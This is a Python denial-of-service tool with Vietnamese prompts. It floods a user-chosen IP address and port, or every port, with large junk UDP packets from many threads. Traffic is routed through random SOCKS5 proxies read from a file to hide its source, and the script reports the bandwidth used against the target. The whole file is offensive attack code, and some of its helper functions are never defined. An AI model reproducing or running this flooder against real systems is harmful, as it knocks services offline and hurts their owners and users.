from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import randint, choice
from time import time, sleep
from pystyle import *
from getpass import getpass as hinput
import socks  # Thêm thư viện socks
import os

class Brutalize:

    def __init__(self, ip, port, force, threads, proxies):
        self.ip = ip
        self.port = port
        self.force = force  # default: 1250
        self.threads = threads  # default: 100
        self.proxies = proxies  # Danh sách proxy

        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    
    def info(self):
        interval = 0.05
        now = time()
        size = 0
        self.total = 0
        bytediff = 8
        mb = 1000000
        gb = 1000000000
        
        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(stage(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"), end='\r')

            now2 = time()
        
            if now + 1 >= now2:
                continue
            
            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                # Chọn proxy ngẫu nhiên từ danh sách
                proxy = choice(self.proxies)
                proxy_ip, proxy_port = proxy
                client = socks.socksocket()
                client.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
                client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

# Các phần khác của mã nguồn không thay đổi...

def load_proxies(filename="socks5.txt"):
    if not os.path.exists(filename):
        error(f"File {filename} không tồn tại. Vui lòng tạo file và thêm proxy vào.")
    
    with open(filename, "r") as file:
        proxies = [line.strip().split(':') for line in file if line.strip()]
    
    if not proxies:
        error(f"File {filename} không chứa proxy hợp lệ.")
    
    return proxies

def main():
    print()
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))

    ip = input(stage(f"Nhập ip muốn đấm :) {purple}->{fluo2} ", '+'))
    print()

    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.',''))
    except:
        error("Lỗi rồi! Vui lòng nhập ip đúng.")

    port = input(stage(f"Nhập port {purple}[{white}press {fluo2}enter{white} đấm all ports{purple}] {purple}->{fluo2} ", '?'))
    print()

    if port == '':
        port = None 
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            error("Lỗi rồi! vui lòng nhập port đúng")

    force = input(stage(f"Bytes per packet {purple}[{white}press {fluo2}enter{white} for 1250{purple}] {purple}->{fluo2} ", '?'))
    print()

    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            error("Lỗi! Vui lòng nhập force.")

    threads = input(stage(f"Nhập Threads {purple}[{white}press {fluo2}enter{white} for 100{purple}] {purple}->{fluo2} ", '?'))
    print()

    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            error("Lỗi! Vui lòng nhập luồng.")

    # Đọc proxy từ file socks5.txt
    proxies = load_proxies()

    print()
    cport = '' if port is None else f'{purple}:{fluo2}{port}'
    print(stage(f"Bắt đầu đấm {fluo2}{ip}{cport}{white} với {fluo}{len(proxies)}{white} proxy."), end='\r')

    brute = Brutalize(ip, port, force, threads, proxies)
    try:
        brute.flood()
    except:
        brute.stop()
        error("Một lỗi nghiêm trọng đã xảy ra và cuộc tấn công đã bị dừng lại.", '')
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(stage(f"Đã ngừng đấm. {fluo2}{ip}{cport}{white} đã bị đấm bởi Nguyễn Văn Tú {fluo}{round(brute.total, 1)} {white}Gb.", '.'))
    print('\n')
    sleep(1)

    hinput(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))

if __name__ == '__main__':
    main()
